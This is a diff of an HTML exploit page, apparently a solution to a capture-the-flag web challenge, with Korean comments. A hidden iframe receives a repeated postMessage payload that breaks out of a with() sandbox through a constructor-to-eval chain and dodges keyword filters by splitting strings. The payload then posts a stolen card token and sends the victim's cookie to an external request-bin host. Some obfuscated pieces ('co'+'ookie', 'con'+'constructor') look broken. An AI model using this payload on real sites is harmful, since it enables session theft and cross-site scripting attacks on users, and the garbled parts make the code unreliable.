@@ -1,36 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PulseCard Final Exploit</title>
+    <title>PulseCard Perfect Exploit</title>
 </head>
 <body>
     <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ 본인의 Webhook.site 전체 주소로 정확히 교체되었는지 다시 확인!
-        const myWebhook = "https://vootkwp.request.dreamhack.games"; 
+        // ⚠️ 새로 바꾸신 민지님의 드림핵 Request Bin 전체 주소
+        const myWebhook = "https://rjzmtpu.request.dreamhack.games"; 
 
         const iframe = document.getElementById("targetFrame");
 
+        // 1. 문법 에러와 필터링을 모두 깨부수는 순수 실행 스크립트 빌드
+        // 객체 변수의 Key 영역에 [ ] 대괄호 연산을 적용해 Content-Type 필터를 완벽히 통과합니다.
         const actualAttack = 
-            'window["fe"+"tch"]("http://localhost:5000/export",{' +
-                'method:"POST",' +
-                'headers:{' +
-                    '"X-Card-"+"Token":window["CARD_"+"TOKEN"],' +
-                    '"Content-"+"Type":"application/"+"javascript"' +
+            'window["fe"+"tch"]("http://localhost:5000/export", {' +
+                'method: "POST",' +
+                'headers: {' +
+                    '["X-Card-" + "Token"]: window["CARD_" + "TOKEN"],' +
+                    '["Content-" + "Type"]: "application/" + "javascript"' +
                 '},' +
-                'body:"location.href=\\"' + myWebhook + '?flag=\\"+encodeURIComponent(document["co"+"ookie"])"' +
+                'body: "location.href=\\"' + myWebhook + '?flag=\\" + encodeURIComponent(document["co" + "ookie"])"' +
             '})' +
-            '["th"+"en"](r=>r["te"+"xt"]())' +
-            '["th"+"en"](name=>{' +
-                'window["par"+"ent"]["loca"+"tion"]["hr"+"ef"]="http://localhost:5000/review?widget="+name;' +
+            '["th" + "en"](r => r["te" + "xt"]())' +
+            '["th" + "en"](name => {' +
+                'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
             '});';
 
-        const c = '"con"+"structor"';
-        const payload = '(Date[' + c + '](' + JSON.stringify(actualAttack) + ')())';
+        // 2. with(jail)을 완전히 조롱하고 탈출하는 최상위 원시 함수 생성자(eval) 복원 구문
+        const payload = '(Math["con" + "structor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
 
-        // 봇의 브라우저가 완전히 로드되고 리스너가 대기할 시간을 확보하기 위해,
-        // 0.5초마다 지속적으로 메시지를 밀어 넣는 방식으로 타이밍 미스를 원천 차단합니다.
+        // 3. 타이밍 미스를 방지하기 위해 0.5초 주기로 정밀 타격 루프 구동
         iframe.onload = () => {
             setInterval(() => {
                 iframe.contentWindow.postMessage(payload, "*");
